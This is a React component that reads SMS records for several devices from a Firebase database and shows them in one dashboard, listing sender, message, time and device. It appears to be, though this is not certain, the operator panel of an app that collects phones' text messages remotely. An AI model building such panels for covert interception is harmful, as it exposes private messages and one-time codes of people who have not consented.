import React, { useState, useEffect } from 'react';
import { ref, onValue } from 'firebase/database';
import { db } from '../firebase';
import { auth } from "../firebase";

const SMSPage = () => {
  const [allSMS, setAllSMS] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const dbPath = localStorage.getItem("dbPath_" + auth.currentUser?.uid);
    if (!dbPath) return;

    const devicesRef = ref(db, dbPath);
    
    const unsubscribe = onValue(devicesRef, (snapshot) => {
      try {
        const devicesData = snapshot.val();
        const smsList = [];

        if (devicesData) {
          Object.entries(devicesData).forEach(([deviceId, deviceData]) => {
            if (deviceData.sms) {
              Object.entries(deviceData.sms).forEach(([smsId, smsData]) => {
                smsList.push({
                  id: smsId,
                  deviceId: deviceId,
                  deviceName: deviceData.deviceInfo?.deviceName || 'Unknown Device',
                  ...smsData
                });
              });
            }
          });
        }

        smsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
        setAllSMS(smsList);
        setLoading(false);
      } catch (err) {
        setError('Error fetching SMS: ' + err.message);
        setLoading(false);
      }
    }, (error) => {
      setError('Error fetching SMS: ' + error.message);
      setLoading(false);
    });

    return () => unsubscribe();
  }, []);

  const formatDateTime = (dateTime) => {
    return dateTime || 'N/A';
  };

  const formatTimestamp = (timestamp) => {
    if (!timestamp) return 'N/A';
    const date = new Date(timestamp);
    const now = new Date();
    const diffInHours = (now - date) / (1000 * 60 * 60);
    
    if (diffInHours < 24) {
      return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    } else {
      return date.toLocaleDateString([], { month: 'short', day: 'numeric' });
    }
  };

  const getMessagePreview = (message) => {
    if (!message) return 'No message';
    return message.length > 120 ? message.substring(0, 120) + '...' : message;
  };

  if (loading) return <div className="loading">Loading all SMS messages...</div>;
  if (error) return <div className="error">{error}</div>;

  return (
    <div>
      <div className="page-header">
        <h1 className="page-title">All SMS Messages</h1>
        <div className="badge badge-primary">Total: {allSMS.length} messages</div>
      </div>

      {allSMS.length === 0 ? (
        <div className="card">
          <p>No SMS messages found.</p>
        </div>
      ) : (
        <div>
          {allSMS.map((sms) => (
            <div key={sms.id} className="sms-card">
              <div className="sms-header">
                <div className="sms-sender">{sms.sender || 'Unknown Sender'}</div>
                <div className="sms-time">
                  <div style={{ fontWeight: '600', color: '#667eea' }}>
                    {formatDateTime(sms.dateTime)}
                  </div>
                  <div style={{ color: '#999', fontSize: '0.7rem' }}>
                    {formatTimestamp(sms.timestamp)}
                  </div>
                </div>
              </div>
              
              <div className="sms-message">
                {getMessagePreview(sms.message)}
              </div>
              
              <div className="sms-footer">
                <span className="badge badge-primary" style={{ fontSize: '0.7rem' }}>
                  {sms.type === 1 ? 'Received' : 'Sent'}
                </span>
                <span className="badge badge-info" style={{ fontSize: '0.7rem' }}>
                  {sms.deviceName}
                </span>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

export default SMSPage;